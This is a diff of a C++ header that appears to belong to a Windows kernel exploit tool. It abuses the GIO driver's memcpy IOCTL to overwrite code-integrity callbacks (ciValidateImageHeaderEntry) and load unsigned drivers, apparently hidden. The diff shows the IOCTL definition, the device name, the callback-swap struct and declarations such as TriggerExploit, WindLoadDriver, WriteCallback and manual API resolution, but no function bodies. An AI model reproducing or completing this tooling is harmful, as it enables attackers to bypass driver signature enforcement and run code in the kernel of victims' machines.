@@ -6,18 +6,19 @@
 #include <cstdio>   
 #include <cstdint> 
 #include <shlwapi.h>  
+#include <thread>
+#include <chrono>
 
 #pragma comment(lib, "shlwapi.lib")  
 #pragma comment(lib, "ntdll.lib") 
 
 #define FILE_DEVICE_GIO				(0xc350)
 #define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
+#define dev_name					L"\\Device\\GIO"
 
 static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
 
-struct seCiCallbacks_swap
-{
+struct seCiCallbacks_swap {
 	DWORD64 ciValidateImageHeaderEntry;
 	DWORD64 zwFlushInstructionCache;
 };
@@ -30,7 +31,7 @@ typedef struct _GIOMemcpyInput
 } GIOMemcpyInput, * PGIOMemcpyInput;
 
 namespace vuln {
-	NTSTATUS TriggerExploit( _In_ PWSTR LoaderServiceName, _In_ PWSTR DriverServiceName );
+	NTSTATUS TriggerExploit( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load );
 
 	NTSTATUS WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden );
 
@@ -55,12 +56,23 @@ namespace modules {
 }
 
 namespace helpers {
-	DWORD64 FindBytes64( DWORD64 imageBase, SIZE_T imageSize, const unsigned char* pattern, SIZE_T patternLen );
+
+	DWORD64 FindInstructionWithPattern( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, size_t patternSize, size_t offsetAfterMatch );
+
+	bool CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr );
 
 	void FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName );
 
 	int ConvertToNtPath( PWCHAR Dst, PWCHAR Src );
 
-	void DeleteService( PWCHAR ServiceName );
+    NTSTATUS ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 &outValue );
+
+	NTSTATUS WriteCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 value );
+
+	NTSTATUS EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName );
+
+	PVOID GetProcessHeapFromPEB();
+
+	uintptr_t GetProcAddress( void* hModule, const wchar_t* wAPIName );
 }
 
